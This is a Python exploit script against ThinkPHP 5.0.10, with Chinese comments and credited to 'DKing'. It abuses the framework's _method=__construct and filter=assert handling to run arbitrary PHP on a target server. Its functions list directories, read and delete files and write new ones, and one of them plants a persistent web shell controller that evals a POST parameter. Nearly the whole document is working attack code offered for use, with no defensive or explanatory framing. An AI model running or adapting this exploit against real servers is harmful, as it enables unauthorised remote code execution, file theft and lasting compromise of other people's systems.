# -*- encoding: utf8 -*-

'''
    Thinkphp 5.0.10 Exploit
        by DKing
'''

import requests
import base64
import re


#_url = 'https://qaq.link/'
#_proxies = {}
#_headers = {}
#_auth = ('DKing', 'DKing')

_url = 'http://wwww.xxxxxx.com'
_proxies = {'http': 'http://127.0.0.1:2081/', 'https': 'http://127.0.0.1:2081/'}        # 改代理
_headers = {'Cookie': 'PHPSESSID=fbg7079bj6968cts9ulc597703',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'}
_auth = None


def send_payload(data):
    try:
        r=requests.post(_url, data=data, proxies=_proxies, headers=_headers, timeout=5, auth=_auth)
    except:
        print('超时，请重试')
        return False
    if 'Cannot call assert() with string argument dynamically' in r.text:
        print('PHP版本过高')
        return False
    before_exception = r.text.split('<div class="exception">')
    if len(before_exception) == 1:
        return False
    after_echo = before_exception[0].split('<div class="echo">')
    if len(after_echo) == 1:
        return False
    result = after_echo[1].split('</div>')[0][11:-4]
    if not result:
        print('返回内容为空')
        return True
    return result

def run_php_script(script):
    payload =  {
        's': script,
        '_method': '__construct',
        'filter': 'assert'
    }
    return send_payload(payload)


def list_dir(path):
    script = 'var_dump(scandir("' + path.replace('"', '\\"') + '"))'
    var_dumps = run_php_script(script)
    if var_dumps and var_dumps is not True:
        return re.findall(r'\s+string\(\d+\)\s\"(.+)\"', var_dumps)

def write_file(filename, content):
    encoded_content = str(base64.b64encode(content.encode('utf-8')),'utf-8')
    script = 'file_put_contents("%s", base64_decode("%s"))' % (filename.replace('"', '\\"'), encoded_content)
    return run_php_script(script)

def dump_file(path, method=1):
    if method == 1:
        script = 'include("%s")' % (path.replace('"', '\\"'))
        return run_php_script(script)
    else:
        payload2 =  {
            '_method': '__construct',
            'method': 'get',
            'filter[]': 'think\\__include_file',
            'get[]': path,
            'server[]': 'phpinfo',
        }
        return send_payload(payload2)


def delete_file(filename):
    script = 'unlink("%s")' % filename
    return run_php_script(script)


def write_shell(module_name='index', shell_name='Indexa', key='cmd'):
    # 创建控制器
    filename = '../application/%s/controller/%s.php' % (module_name, shell_name)
    content = '''<?php
namespace app\%s\controller;

class %s
{
    public function index()
    {
        eval($_POST['%s']);
    }
}
''' % (module_name, shell_name, key)
    write_file(filename, content)
    folder = '../application/%s/controller/' % (module_name)
    current_files = list_dir(folder)
    if current_files and (shell_name + '.php' in current_files):
        print('Write OK')
        print(dump_file(filename))
    else:
        print('Failed to write shell')

if __name__ == '__main__':
    list_dir('.')
    list_dir('../application')
    dump_file('../application/.htaccess')
